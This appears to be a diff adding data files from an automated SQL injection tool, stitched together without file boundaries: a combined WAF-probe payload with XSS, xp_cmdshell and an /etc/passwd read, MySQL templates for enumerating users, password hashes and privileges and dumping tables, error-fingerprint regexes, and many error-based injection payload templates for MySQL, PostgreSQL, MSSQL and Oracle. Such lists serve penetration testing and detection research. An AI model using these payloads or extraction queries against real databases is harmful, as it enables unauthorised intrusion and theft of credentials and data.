@@ -1,0 +1,139 @@
+IDS_WAF_CHECK_PAYLOAD = "AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#"
+
+   <dbms value="MySQL">
+        <cast query="CAST(%s AS CHAR)"/>
+        <length query="CHAR_LENGTH(%s)"/>
+        <isnull query="IFNULL(%s,' ')"/>
+        <delimiter query=","/>
+        <limit query="LIMIT %d,%d"/>
+        <limitregexp query="\s+LIMIT\s+([\d]+)\s*\,\s*([\d]+)" query2="\s+LIMIT\s+([\d]+)"/>
+        <limitgroupstart query="1"/>
+        <limitgroupstop query="2"/>
+        <limitstring query=" LIMIT "/>
+        <order query="ORDER BY %s ASC"/>
+        <count query="COUNT(%s)"/>
+        <comment query="-- " query2="/*" query3="#"/>
+        <substring query="MID((%s),%d,%d)"/>
+        <concatenate query="CONCAT(%s,%s)"/>
+        <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
+        <hex query="HEX(%s)"/>
+        <inference query="ORD(MID((%s),%d,1))>%d"/>
+        <banner query="VERSION()"/>
+        <current_user query="CURRENT_USER()"/>
+        <current_db query="DATABASE()"/>
+        <hostname query="@@HOSTNAME"/>
+        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
+        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
+        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
+        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
+        <users>
+            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user"/>
+            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user"/>
+        </users>
+        <passwords>
+            <inband query="SELECT user,password FROM mysql.user" condition="user"/>
+            <blind query="SELECT DISTINCT(password) FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user='%s'"/>
+        </passwords>
+        <privileges>
+            <inband query="SELECT grantee,privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES" condition="grantee" query2="SELECT user,select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user" condition2="user"/>
+            <blind query="SELECT DISTINCT(privilege_type) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee %s '%s' LIMIT %d,1" query2="SELECT select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(privilege_type)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee %s '%s'" count2="SELECT COUNT(*) FROM mysql.user WHERE user='%s'"/>
+        </privileges>
+        <roles/>
+        <dbs>
+            <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA" query2="SELECT db FROM mysql.db"/>
+            <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1" query2="SELECT DISTINCT(db) FROM mysql.db LIMIT %d,1" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db"/>
+        </dbs>
+        <tables>
+            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.TABLES" condition="table_schema"/>
+            <blind query="SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' LIMIT %d,1" count="SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'"/>
+        </tables>
+        <columns>
+            <inband query="SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
+            <blind query="SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" query2="SELECT column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND column_name='%s' AND table_schema='%s'" count="SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
+        </columns>
+        <dump_table>
+            <inband query="SELECT %s FROM %s.%s ORDER BY %s"/>
+            <blind query="SELECT %s FROM %s.%s ORDER BY %s LIMIT %d,1" count="SELECT COUNT(*) FROM %s.%s"/>
+        </dump_table>
+        <search_db>
+            <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" query2="SELECT db FROM mysql.db WHERE %s" condition="schema_name" condition2="db"/>
+            <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" query2="SELECT DISTINCT(db) FROM mysql.db WHERE %s" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db WHERE %s" condition="schema_name" condition2="db"/>
+        </search_db>
+        <search_table>
+            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.TABLES WHERE %s" condition="table_name" condition2="table_schema"/>
+            <blind query="SELECT DISTINCT(table_schema) FROM INFORMATION_SCHEMA.TABLES WHERE %s" query2="SELECT DISTINCT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" count="SELECT COUNT(DISTINCT(table_schema)) FROM INFORMATION_SCHEMA.TABLES WHERE %s" count2="SELECT COUNT(DISTINCT(table_name)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" condition="table_name" condition2="table_schema"/>
+        </search_table>
+        <search_column>
+            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" condition="column_name" condition2="table_schema" condition3="table_name"/>
+            <blind query="SELECT DISTINCT(table_schema) FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" query2="SELECT DISTINCT(table_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s'" count="SELECT COUNT(DISTINCT(table_schema)) FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" count2="SELECT COUNT(DISTINCT(table_name)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s'" condition="column_name" condition2="table_schema" condition3="table_name"/>
+        </search_column>
+    </dbms>
+	
+	<dbms value="MySQL">
+        <error regexp="SQL syntax.*MySQL"/>
+        <error regexp="Warning.*mysql_.*"/>
+        <error regexp="MySqlException \(0x"/>
+        <error regexp="valid MySQL result"/>
+        <error regexp="check the manual that corresponds to your (MySQL|MariaDB) server version"/>
+        <error regexp="MySqlClient\."/>
+        <error regexp="com\.mysql\.jdbc\.exceptions"/>
+    </dbms>
+
+AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))
+OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))
+AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))
+OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))
+AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])
+OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])
+AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)
+AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)
+OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)
+AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+AND [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')
+OR [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')
+AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')
+OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')
+AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')
+OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')
+AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')
+OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')
+AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')
+OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')
+PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)
+(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))
+JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))
+(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))
+(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))
+(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))
+(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))
+(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))
+(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')
+(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))
+,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)
+,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x)))s)
+,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8))))x)
+,(SELECT 1 FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])
+,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)
+,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))
+,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))
+,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))
+,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+,(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))
